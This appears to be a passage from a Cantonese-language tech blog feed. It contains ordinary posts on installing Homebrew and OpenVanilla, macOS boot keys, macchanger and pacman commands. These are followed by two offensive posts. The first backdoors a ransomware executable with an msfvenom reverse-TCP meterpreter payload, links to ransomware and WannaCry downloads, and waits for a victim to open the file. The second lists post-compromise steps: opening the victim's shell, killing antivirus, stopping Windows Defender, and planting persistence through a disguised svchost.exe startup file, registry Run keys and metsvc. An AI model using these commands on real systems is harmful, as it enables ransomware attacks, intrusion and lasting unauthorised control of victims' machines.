<h2 id="打開"><a href="#打開" class="headerlink" title="打開"></a>打開</h2><p>將下載回來的檔案按兩下右鍵打開。</p>
<img src="/2022/01/16/MacOS-install-OpenVanilla/1.png" class="">

<h2 id="同意安裝"><a href="#同意安裝" class="headerlink" title="同意安裝"></a>同意安裝</h2><p>他會問你是否同意，按下 <code>同意安裝</code>，然後就會開始安裝。</p>
<img src="/2022/01/16/MacOS-install-OpenVanilla/2.png" class="">


<h2 id="安裝成功"><a href="#安裝成功" class="headerlink" title="安裝成功"></a>安裝成功</h2><p>已經成功安裝。<br>按 <code>好</code>。</p>
<img src="/2022/01/16/MacOS-install-OpenVanilla/3.png" class="">


<h2 id="更改輸入法"><a href="#更改輸入法" class="headerlink" title="更改輸入法"></a>更改輸入法</h2><p>現在在右上角切換輸入法你會看到 <code>OpenVanilla</code>，將他切換後你就可以使用了。</p>
<img src="/2022/01/16/MacOS-install-OpenVanilla/5.png" class="">

<p><a href="https://openvanilla.org/">https://openvanilla.org/</a><br><a href="https://lihkg.com/thread/2197929/page/1">https://lihkg.com/thread/2197929/page/1</a></p>
]]></content>
      <categories>
        <category>MacOS</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>Gui</tag>
      </tags>
  </entry>
  <entry>
    <title>MacOS - 安裝 Homebrew</title>
    <url>/2022/01/09/MacOS-install-homebrew/</url>
    <content><![CDATA[<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p><a href="https://brew.sh/">Homebrew</a> 是一款自由及開放原始碼的軟體套件管理系統，用以簡化macOS系統上的軟體安裝過程，最初由馬克斯·霍威爾（Max Howell）寫成。因其可延伸性得到了一致好評，而在Ruby on Rails社群廣為人知。<br>Homebrew使用GitHub，通過使用者的貢獻擴大對軟體套件的支援。2012年，Homebrew是GitHub上擁有最多新貢獻者的專案[4]。2013年，Homebrew同時成為GitHub上最多貢獻者及最多已關閉問題的專案。 </p>
<h1 id="安裝-HomeBrew"><a href="#安裝-HomeBrew" class="headerlink" title="安裝 HomeBrew"></a>安裝 HomeBrew</h1><p>開 Termnial 打呢抽野</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/bash -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>完成之後只係安裝左，仲未set paths俾佢，再打</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;eval $(/opt/homebrew/bin/brew shellenv)&#x27;</span> &gt;&gt; /Users/homefolder/.zprofile</span><br><span class="line"><span class="built_in">eval</span> $(/opt/homebrew/bin/brew shellenv)</span><br></pre></td></tr></table></figure>

<p>之後打再試下喺 Terminal 打 <code>brew</code> 就得了。</p>
<p>常用相關指令介紹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> brew install 套件名稱                 // 安裝套件</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> brew uninstall 套件名稱               // 卸載套件</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> brew search 套件名稱                  // 查詢套件</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> brew info 套件名稱                    // 查看套件訊息</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> brew services start 套件名稱          // 啟動套件</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> brew services stop 套件名稱           // 停止套件</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> brew services restart 套件名稱        // 重啟套件</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> brew list                  // 查詢已安裝的套件</span>      </span><br><span class="line"><span class="meta">$</span><span class="bash"> brew <span class="built_in">help</span>                  // 幫助</span>      </span><br><span class="line"><span class="meta">$</span><span class="bash"> brew -v                    // 查看版本</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> brew doctor                // 查看HomeBrew狀態</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> brew --prefix              // 查看HomeBrew安裝到哪個路徑</span></span><br></pre></td></tr></table></figure>

<h1 id="刪除-HomeBrew"><a href="#刪除-HomeBrew" class="headerlink" title="刪除 HomeBrew"></a>刪除 HomeBrew</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/bin/ruby -e &quot;$(curl -fsSL https://mirrors.aliyun.com/homebrew/brew/install/master/uninstall)&quot;</span><br></pre></td></tr></table></figure>

<p>參考資料 :<br><a href="https://brew.sh/">https://brew.sh/</a><br><a href="https://ithelp.ithome.com.tw/articles/10216418">https://ithelp.ithome.com.tw/articles/10216418</a></p>
]]></content>
      <categories>
        <category>MacOS</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>指令</tag>
        <tag>Package Manager</tag>
      </tags>
  </entry>
  <entry>
    <title>MacOS - 開機鍵盤組合</title>
    <url>/2022/01/16/MacOS-startup-key-combinations/</url>
    <content><![CDATA[<img src="/img/Post/image/MacOS/cover.png" width="200px"/>

<h1 id="MacOS-開機鍵盤組合"><a href="#MacOS-開機鍵盤組合" class="headerlink" title="MacOS 開機鍵盤組合"></a>MacOS 開機鍵盤組合</h1><p>以下係 MacOS 既鍵盤組合。</p>
<h2 id="進入-Boot-Menu"><a href="#進入-Boot-Menu" class="headerlink" title="進入 Boot Menu"></a>進入 Boot Menu</h2><p>撳實 Option (⌥) 或者 Alt</p>
<h2 id="進入-Safe-Mode"><a href="#進入-Safe-Mode" class="headerlink" title="進入 Safe Mode"></a>進入 Safe Mode</h2><p>撳實 Shift (⇧)</p>
<h2 id="進入-macOS-Recovery-system"><a href="#進入-macOS-Recovery-system" class="headerlink" title="進入 macOS Recovery system"></a>進入 macOS Recovery system</h2><p>Command (⌘)-R</p>
<h2 id="退出-Eject"><a href="#退出-Eject" class="headerlink" title="退出 (Eject)"></a>退出 (Eject)</h2><p>退出 (⏏) 或 F12 或滑鼠按鈕或觸控板按鈕</p>
<p><a href="https://www.makeuseof.com/tag/boot-mode-startup-keys-mac/">https://www.makeuseof.com/tag/boot-mode-startup-keys-mac/</a><br><a href="https://support.apple.com/en-gb/HT201255">https://support.apple.com/en-gb/HT201255</a><br><a href="https://support.apple.com/zh-tw/HT201255">https://support.apple.com/zh-tw/HT201255</a></p>
]]></content>
      <categories>
        <category>MacOS</category>
      </categories>
      <tags>
        <tag>BIOS</tag>
        <tag>Shortkeys</tag>
      </tags>
  </entry>
  <entry>
    <title>Macchanger - 控制 Mac Address</title>
    <url>/2022/01/30/Macchanger-commands/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>GNU MAC Changer 是一個使網絡接口的 MAC 地址操作更容易的實用程序，以提供一種跨多個網絡跟踪計算機的簡便方法。<br>通過定期更改 MAC 地址，可以阻止這種跟踪，或者至少使這種跟踪變得更加困難。</p>
<h1 id="MAC-位置是什麼？"><a href="#MAC-位置是什麼？" class="headerlink" title="MAC 位置是什麼？"></a>MAC 位置是什麼？</h1><p>MAC 地址是網絡上的唯一標識符，亦可以在大多數網絡硬件上更改。</p>
<h1 id="Mac-Changer"><a href="#Mac-Changer" class="headerlink" title="Mac Changer"></a>Mac Changer</h1><p>要用 Macchanger，<br>我地首先要學識睇兩樣野：</p>
<ul>
<li>Mac Address : 下圖中，<span style="color:green">綠色圈</span> 既位置就係你而加既 mac address。</li>
<li>網路卡名稱 : 下圖中，<span style="color:yellow">黃色圈</span> 既位置就係你張上網卡既名。</li>
</ul>
<p>輸入以下指令查看你的 Mac Address :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
<img src="/2022/01/30/Macchanger-commands/ifconfig.png" class="">

<h2 id="網路名稱說明"><a href="#網路名稱說明" class="headerlink" title="網路名稱說明"></a>網路名稱說明</h2><p>eth0 : 呢個名稱係好大部分既通常名稱，喺 Linux 世界入面，eth0 代表 lan 卡.. eth0, eth1 … etc<br>wlan0 : 呢個名稱係好大部分既通常名稱，喺 Linux 世界入面，wlan0 代表 wifi卡.. wlan0, wlan1 … etc</p>
<h2 id="將網路卡斷開-選項"><a href="#將網路卡斷開-選項" class="headerlink" title="將網路卡斷開 (選項)"></a>將網路卡斷開 (選項)</h2><p>呢一步可以做可以唔做，做左更安全，喺改變 Mac Address 之前，將網卡斷開。</p>
<blockquote>
<p>建議說明：將你而加張卡斷開左再改，改完再將張卡開返，咁樣做係最重全既手法，可以避開俾人追蹤既風險。</p>
</blockquote>
<hr>
<h3 id="斷開網卡格式"><a href="#斷開網卡格式" class="headerlink" title="斷開網卡格式"></a>斷開網卡格式</h3><p>由上圖見到既 <code>eth0</code> 位置就係你既網卡名稱。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ifconfig [iface name] down</span><br></pre></td></tr></table></figure>

<h3 id="斷開網卡示範"><a href="#斷開網卡示範" class="headerlink" title="斷開網卡示範"></a>斷開網卡示範</h3><p>輸入以下指令斷開網卡 :</p>
<blockquote>
<p>說明 : 輸入該指令後右上角會顯示已斷開連線。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ifconfig eth0 down</span><br></pre></td></tr></table></figure>

<img src="/2022/01/30/Macchanger-commands/down.png" class="">

<h2 id="Mac-Addrees-更改"><a href="#Mac-Addrees-更改" class="headerlink" title="Mac Addrees 更改"></a>Mac Addrees 更改</h2><hr>
<h3 id="Random-更改-MAC-Address"><a href="#Random-更改-MAC-Address" class="headerlink" title="Random 更改 MAC Address"></a>Random 更改 MAC Address</h3><p>隨機咁改 mac address，<code>-r</code> = random。</p>
<ul>
<li><span style="color:green">綠色圈</span> 既位置係你上一次改完既 Mac Address 既位置。</li>
<li><span style="color:yellow">黃色圈</span> 既位置係你原本既 Mac Address。</li>
<li><span style="color:darkred">暗紅色圈</span> 既位置係你今次改完 Mac Address 既位置。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">macchanger -r eth0</span><br></pre></td></tr></table></figure>

<img src="/2022/01/30/Macchanger-commands/-r.png" class="">

<h3 id="還原本來-Mac-Address"><a href="#還原本來-Mac-Address" class="headerlink" title="還原本來 Mac Address"></a>還原本來 Mac Address</h3><p><code>-p</code> = permanent</p>
<ul>
<li><span style="color:green">綠色圈</span> 既位置係你上一次改完既 Mac Address 既位置。</li>
<li><span style="color:yellow">黃色圈</span> 既位置係你原本既 Mac Address。</li>
<li><span style="color:darkred">暗紅色圈</span> 既位置係你今次改完 Mac Address 既位置。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">macchanger -p eth0</span><br></pre></td></tr></table></figure>

<img src="/2022/01/30/Macchanger-commands/-p.png" class="">

<h3 id="指定-Mac-Address"><a href="#指定-Mac-Address" class="headerlink" title="指定 Mac Address"></a>指定 Mac Address</h3><p><code>-m</code> = mac，然後輸入六組數雙位數字。</p>
<ul>
<li><span style="color:green">綠色圈</span> 既位置係你上一次改完既 Mac Address 既位置。</li>
<li><span style="color:yellow">黃色圈</span> 既位置係你原本既 Mac Address。</li>
<li><span style="color:darkred">暗紅色圈</span> 既位置係你今次改完 Mac Address 既位置。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">macchanger -m 12:34:56:78:89:11 eth0</span><br></pre></td></tr></table></figure>
<img src="/2022/01/30/Macchanger-commands/-m.png" class="">

<h3 id="製造商資訊"><a href="#製造商資訊" class="headerlink" title="製造商資訊"></a>製造商資訊</h3><p>以下指令可以令你改變 Mac address 製造商資訊。</p>
<hr>
<h4 id="偽裝製造商"><a href="#偽裝製造商" class="headerlink" title="偽裝製造商"></a>偽裝製造商</h4><p>列出製造商的 Mac Address 位置。</p>
<p>偽裝成其他製造商的新的假 Mac Address。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">macchanger -A eth0</span><br></pre></td></tr></table></figure>

<h4 id="保留製造商"><a href="#保留製造商" class="headerlink" title="保留製造商"></a>保留製造商</h4><p>保留目前製造商資訊，產生新 MAC Address</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">macchanger -e eth0</span><br></pre></td></tr></table></figure>

<h4 id="查看製造商位置"><a href="#查看製造商位置" class="headerlink" title="查看製造商位置"></a>查看製造商位置</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">macchanger -l</span><br></pre></td></tr></table></figure>

<img src="/2022/01/30/Macchanger-commands/-l.png" class="">


<h2 id="重新連接網卡"><a href="#重新連接網卡" class="headerlink" title="重新連接網卡"></a>重新連接網卡</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ifconfig eth0 up</span><br></pre></td></tr></table></figure>

<img src="/2022/01/30/Macchanger-commands/up.png" class="">

<p>參考資料<br><a href="https://www.kali.org/tools/macchanger/">https://www.kali.org/tools/macchanger/</a><br><a href="https://ithelp.ithome.com.tw/articles/10205861">https://ithelp.ithome.com.tw/articles/10205861</a><br><a href="https://www.hackingtutorials.org/general-tutorials/mac-address-spoofing-with-macchanger/">https://www.hackingtutorials.org/general-tutorials/mac-address-spoofing-with-macchanger/</a><br><a href="https://ithelp.ithome.com.tw/articles/10281860">https://ithelp.ithome.com.tw/articles/10281860</a></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Manjaro pacman 指令</title>
    <url>/2022/01/29/Manjaro-pacman-commands/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>pacman 係 Manjaro 同 arch 會用既 Package Manager，以下列出常用指令。</p>
<hr>
<h1 id="Update-Upgrade"><a href="#Update-Upgrade" class="headerlink" title="Update / Upgrade"></a>Update / Upgrade</h1><p>以下指令有關 update / upgrade Package。</p>
<hr>
<h2 id="Update"><a href="#Update" class="headerlink" title="Update"></a>Update</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -Sy</span><br></pre></td></tr></table></figure>

<h2 id="Upgrade-Package"><a href="#Upgrade-Package" class="headerlink" title="Upgrade Package"></a>Upgrade Package</h2><ul>
<li>S = 同步</li>
<li>y = refresh</li>
<li>u = 系統更新</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -Syu</span><br></pre></td></tr></table></figure>

<h1 id="安裝指令"><a href="#安裝指令" class="headerlink" title="安裝指令"></a>安裝指令</h1><p>以下指令有關安裝套件。</p>
<hr>
<h2 id="安裝-Package"><a href="#安裝-Package" class="headerlink" title="安裝 Package"></a>安裝 Package</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S package_name_1 package_name_2</span><br></pre></td></tr></table></figure>

<h2 id="安裝第三方-Package"><a href="#安裝第三方-Package" class="headerlink" title="安裝第三方 Package"></a>安裝第三方 Package</h2><p>安裝 <code>(.pkg.tar.xz)</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -U packagename.pkg.tar.xz</span><br></pre></td></tr></table></figure>

<h1 id="刪除指令"><a href="#刪除指令" class="headerlink" title="刪除指令"></a>刪除指令</h1><p>以下指令有關刪除 Package。</p>
<hr>
<h2 id="Delete-Package"><a href="#Delete-Package" class="headerlink" title="Delete Package"></a>Delete Package</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -R package_name</span><br></pre></td></tr></table></figure>

<h2 id="Del-Package-del-埋唔需要既-Package"><a href="#Del-Package-del-埋唔需要既-Package" class="headerlink" title="Del Package (del 埋唔需要既 Package)"></a>Del Package (del 埋唔需要既 Package)</h2><p>相等於 apt 入面既 <code>autoremove</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -Rs package_name</span><br></pre></td></tr></table></figure>

<h2 id="刪除-lock-files"><a href="#刪除-lock-files" class="headerlink" title="刪除 lock files"></a>刪除 lock files</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudi rm -rf /var/lib/pacman/db.lock</span><br></pre></td></tr></table></figure>

<h2 id="清除-package-cache"><a href="#清除-package-cache" class="headerlink" title="清除 package cache"></a>清除 package cache</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo paccache -r</span><br></pre></td></tr></table></figure>

<h2 id="刪除未安裝的所有緩存包和未同步數據庫"><a href="#刪除未安裝的所有緩存包和未同步數據庫" class="headerlink" title="刪除未安裝的所有緩存包和未同步數據庫"></a>刪除未安裝的所有緩存包和未同步數據庫</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -Sc</span><br></pre></td></tr></table></figure>

<h2 id="刪除所有-cache-文件"><a href="#刪除所有-cache-文件" class="headerlink" title="刪除所有 cache 文件"></a>刪除所有 cache 文件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -Scc</span><br></pre></td></tr></table></figure>

<h1 id="seek-Package"><a href="#seek-Package" class="headerlink" title="seek Package"></a>seek Package</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -Ss package_name</span><br></pre></td></tr></table></figure>

<h1 id="查已經存在既-Package"><a href="#查已經存在既-Package" class="headerlink" title="查已經存在既 Package"></a>查已經存在既 Package</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -Qs on99</span><br></pre></td></tr></table></figure>

<p>參考資料<br><a href="https://itsfoss.com/pacman-command/">https://itsfoss.com/pacman-command/</a></p>
]]></content>
      <categories>
        <category>Manjaro</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit - exe 注入 Ransomware 程式 (非常仆街)</title>
    <url>/2022/01/09/Metasploit-Ransomware-Attack/</url>
    <content><![CDATA[<h1 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a>Requirements</h1><ul>
<li>Ransomware Builder Or Ransomware File.</li>
<li>a Windows Victim PC</li>
<li>A Linux for Metasploit using</li>
</ul>
<p>U can download Ransomware builder from here.<br><a href="http://www.mediafire.com/file/rpeo9mwl59rlwe7/ransomware_builder_pack.rar/file">http://www.mediafire.com/file/rpeo9mwl59rlwe7/ransomware_builder_pack.rar/file</a></p>
<p>U can download Wannacry from here.<br><a href="https://www.upload.ee/files/7001087/1.7z.html">https://www.upload.ee/files/7001087/1.7z.html</a></p>
<p>U can download Wanakiwi from hero.<br><a href="https://github.com/gentilkiwi/wanakiwi">https://github.com/gentilkiwi/wanakiwi</a></p>
<p>the program will be like :</p>
<img src="/2022/01/09/Metasploit-Ransomware-Attack/ransomware-builder.png" class="">

<p>Then click on the build, it will create Ransomware for us, then create a key using the same application.</p>
<p>Now we having Ransomware and its key.</p>
<img src="/2022/01/09/Metasploit-Ransomware-Attack/program2.png" class="">

<p>Next Step we need use msfvenom to gen a trojan file. (Backdooring)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -x ransomware.exe -k -p windows/meterpreter/reverse_tcp lhost=[your ipv4] lport=[your port] -e x86/shikata_ga_nai -i 3 -b &quot;\x00&quot; -f exe -o ransomware.exe</span><br></pre></td></tr></table></figure>

<p>OK, Now open metasploit</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>

<p>Set payload, LPORT, LHOST using multi/handler and listening for a reverse TCP connection.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">multi/handler</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set lhost [your private ipv4]</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set [your port]</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>Now,waiting the victim open the file.</p>
<img src="/2022/01/09/Metasploit-Ransomware-Attack/wannacry2.0.png" class="">

<p>Very simple.</p>
<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks:"></a>Thanks:</h1><p><a href="https://hackersdude.com/ransomware-attack-using-metasploit/">https://hackersdude.com/ransomware-attack-using-metasploit/</a></p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Ransomware</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit - 指令列表 (Windows 機入侵後)</title>
    <url>/2021/12/17/Metasploit-commands-HACKED/</url>
    <content><![CDATA[<img src="/img/Post/image/Metasploit/cover.svg" width="200px"/>

<h1 id="操控受害者-CMD"><a href="#操控受害者-CMD" class="headerlink" title="操控受害者 CMD"></a>操控受害者 CMD</h1><p>當你成功入侵佢部機既時候，我地除左用原本 Metasploit 提供既指令之外，仲可以開返佢部機既 CMD 黎用。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; execute -f cmd.exe -i -H</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure>

<p>就可以用到佢部機既 <code>cmd</code> haha</p>


<p>如果你唔想再用佢部機既 cmd 你可以打</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\system32&gt;exit</span><br></pre></td></tr></table></figure>


<h1 id="終止防毒軟件"><a href="#終止防毒軟件" class="headerlink" title="終止防毒軟件"></a>終止防毒軟件</h1><p>我地用 Metasploit 內置既 功能 <code>killav.rb</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run killav.rb</span><br></pre></td></tr></table></figure>


<h1 id="停止-Windows-Defender"><a href="#停止-Windows-Defender" class="headerlink" title="停止 Windows Defender"></a>停止 Windows Defender</h1><p>首先我地要用佢個 <code>cmd</code></p>
<div class="post-outdate-notice">
    注意：用呢個指令需要系統管理員身份。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure>

<p>再打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sc stop WinDefend</span><br></pre></td></tr></table></figure>

<h1 id="生成持續性後門-方法一"><a href="#生成持續性後門-方法一" class="headerlink" title="生成持續性後門 (方法一)"></a>生成持續性後門 (方法一)</h1><p>建立持續性後門有兩種方法，一種係通過啟動項啟動(persistence) ，一種係通過服務啟動(metsvc)，<br>因為 meterpreter 係基於記憶體DLL建立連線，<br>所以，只要部機一熄，我地同佢既連線就會斷開。</p>
<p>但係我地唔想每次連都要佢開file㗎嘛？<br>所以我地以下要做既野就係會令到每當佢部機一開就會自動開我地整出黎既木馬。</p>
<h2 id="快速達成目標"><a href="#快速達成目標" class="headerlink" title="快速達成目標"></a>快速達成目標</h2><p>我地寫條 Script 快快手開完就可以達成目標。原理係將你既檔案放入去 Windows 既 <code>Startup</code> 位置 咁樣只要佢一開部就會將你既 Trojan file 開啟。</p>
<p>我地用 <code>bat file</code>，內容係打呢啲：</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> &quot;svchost.exe&quot; &quot;C:\Users\<span class="variable">%username%</span>\AppData\Roaming\Microsoft\Windows\<span class="built_in">Start</span> Menu\Programs\Startup\&quot;</span><br><span class="line"><span class="built_in">start</span> C:\Users\<span class="variable">%username%</span>\AppData\Roaming\Microsoft\Windows\&quot;<span class="built_in">Start</span> Menu&quot;\Programs\Startup\svchost.exe</span><br><span class="line"><span class="built_in">del</span> %<span class="number">0</span></span><br><span class="line"><span class="built_in">del</span> svchost.exe</span><br></pre></td></tr></table></figure>

<h3 id="兩句既意思係"><a href="#兩句既意思係" class="headerlink" title="兩句既意思係"></a>兩句既意思係</h3><ul>
<li>第一行係解 copy 一個file 去 Windows既 <code>Startup</code> 位置</li>
<li>第二行係解去呢個 Winodws 既 Paths 開呢個 file</li>
<li>第三行係解當你上面個兩句運行完就會將你既而加開既呢個 batch file delete.</li>
<li>第四行係解當你上面個兩句運行完就會將而加呢個位置個個 exe file delete.</li>
</ul>
<p>完成哂之後我去就去返 <code>meterpreter</code> 再打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run persistence -X -i [Second] -p [Port Number] -r [Host Number]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 設置後門在系統啟動後自啟動。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 該方式會在HKLM\Software\Microsoft\Windows\CurrentVersion\Run下添加註冊表信息。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 由於權限問題，會導致添加失敗，後門將無法啟動，因此，在非管理員權限或者未進行BypassUAC操作情況下，不推薦使用該參數。</span></span><br></pre></td></tr></table></figure>

<p>or </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run persistence -U -i [Second] -p [Port Number] -r [Host Number]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 設置後門在用戶登錄後自啟動。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 該方式會在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加註冊表信息，推薦使用該參數；</span> </span><br></pre></td></tr></table></figure>

<p>成句意思就係每五秒會自動連上 你既 [Host Number] 既 [Port Number]<br>之後就會喺目標既機度自動 gen 個 vbs file，<br>再將佢入落去 Regedit (登錄檔)，只要佢一開機就會自己開。</p>
<ul>
<li><p>-P：設置Payload，默認為windows/meterpreter/reverse_tcp。<br>該默認的payload生成的後門為32位程序。<br>因此，當目標機器為64位系統時，留下的後門將無法運行；</p>
</li>
<li><p>-U：設置後門在用戶登錄後自啟動。<br>該方式會在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加註冊表信息，推薦使用該參數。</p>
</li>
<li><p>-X：設置後門在系統啟動後自啟動。<br>該方式會在HKLM\Software\Microsoft\Windows\CurrentVersion\Run下添加註冊表信息。<br>由於權限問題，會導致添加失敗，後門將無法啟動。<br>因此，在非管理員權限或者未進行BypassUAC操作情況下，不推薦使用該參數。</p>
</li>
<li><p>-i：設置反向連接間隔時間，單位為秒，當設置該參數後，目標機器會每隔設置的時間回連一次所設置的ip</p>
</li>
<li><p>-p：設置反向連接的端口號。即等待連接的端口；</p>
</li>
<li><p>-r：設置反向連接的ip地址。即等待連接的ip； </p>
</li>
</ul>
<h1 id="生成持續性後門-方法二，加入服務-需要系統官理員"><a href="#生成持續性後門-方法二，加入服務-需要系統官理員" class="headerlink" title="生成持續性後門 (方法二，加入服務 [需要系統官理員])"></a>生成持續性後門 (方法二，加入服務 [需要系統官理員])</h1><p>利用 metsvc 喺目標主機度安裝 Meterpreter 既服務，<br>當佢開機既時候就會自動開啟。</p>
<h2 id="安裝-metsvc-方法一"><a href="#安裝-metsvc-方法一" class="headerlink" title="安裝 metsvc (方法一)"></a>安裝 metsvc (方法一)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run metsvc</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\Go0s\AppData\Local\Temp\WYPiyqkOsJZS...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">	 * Installing service metsvc</span><br><span class="line"> * Starting service</span><br><span class="line">Service metsvc successfully installed.</span><br></pre></td></tr></table></figure>

<h2 id="安裝-metsvc-方法二"><a href="#安裝-metsvc-方法二" class="headerlink" title="安裝 metsvc (方法二)"></a>安裝 metsvc (方法二)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run metsvc -A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\Go0s\AppData\Local\Temp\WYPiyqkOsJZS...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">	 * Installing service metsvc</span><br><span class="line"> * Starting service</span><br><span class="line">Service metsvc successfully installed.</span><br></pre></td></tr></table></figure>

<h2 id="解除安裝-metsvc"><a href="#解除安裝-metsvc" class="headerlink" title="解除安裝 metsvc"></a>解除安裝 metsvc</h2><p>解除安裝就打 <code>run metsvc -r</code> </p>
